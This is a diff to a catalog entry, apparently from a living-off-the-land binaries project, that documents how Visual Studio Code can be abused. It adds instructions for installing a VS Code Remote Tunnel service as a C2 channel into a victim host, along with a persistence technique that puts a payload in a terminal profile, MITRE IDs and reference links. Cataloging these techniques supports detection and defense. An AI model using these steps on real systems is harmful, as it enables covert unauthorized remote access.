@@ -1,7 +1,7 @@
 ---
 Name: VS Code
 Description: Visual Studio Code, also commonly referred to as VS Code, is a source-code editor made by Microsoft with the Electron Framework, for Windows, Linux and macOS.
-Author: 'Adam Brass and Martin Sohn Christensen'
+Author: 'Adam Brass, Martin Sohn Christensen and Kirill Magaskin'
 Created: 2023-01-29
 Usage:
   - Steps: Override/Create a workspace/settings.json config. Add a new terminal profile with the payload in the "path" and "args" parameters. Set the new terminal profile as default.
@@ -18,12 +18,24 @@ Usage:
     Privileges: User
     Limitations: None
     MitreID: T1546
+    - Steps: Use `.\code.exe tunnel service install --no-sleep` from CLI and authorize yourself on source host with the 6-digit code or use "Turn on Remote Tunnel Access" option in the VS Code GUI account menu and authorize yourself in the browser of target host. Then you'll get a link like: https://vscode.dev/tunnel/<victim's hostname>/<directory>. Open this link in browser and authorize yourself on source host with the same Github/Microsoft account. Once you connect with this link, an SSH connection will be created over the tunnel in order to provide end-to-end encryption.
+    Description: Steps to create and enable a VS Code Remote Tunnel as C2 service.
+    Usecase: Establishing C2 Channel on a Windows host
+    Category: C2 Channel
+    Privileges: User
+    Limitations: You can have only 10 tunnels registered for one account.
+    MitreID: T1572
 Resources:
   - Link: https://twitter.com/nas_bench/status/1618021838407495681
   - Link: https://twitter.com/nas_bench/status/1618021415852335105
   - Link: https://twitter.com/Cyb3rSn0rlax/status/1618201140008734721
+  - Link: https://code.visualstudio.com/docs/remote/tunnels
+  - Link: https://www.linkedin.com/pulse/visual-studio-code-embedded-reverse-shell-how-block-create-thornton
+  - Link: https://www.bleepingcomputer.com/news/security/chinese-hackers-use-visual-studio-code-tunnels-for-remote-access/
 Acknowledgement:
   - Person: 'Nasreddine Bencherchali'
     Handle: '@nas_bench'
   - Person: 'HAMZA'
     Handle: '@Cyb3rSn0rlax'
+  - Person: 'Truvis Thornton'
+    Handle: '@truvis.thornton'
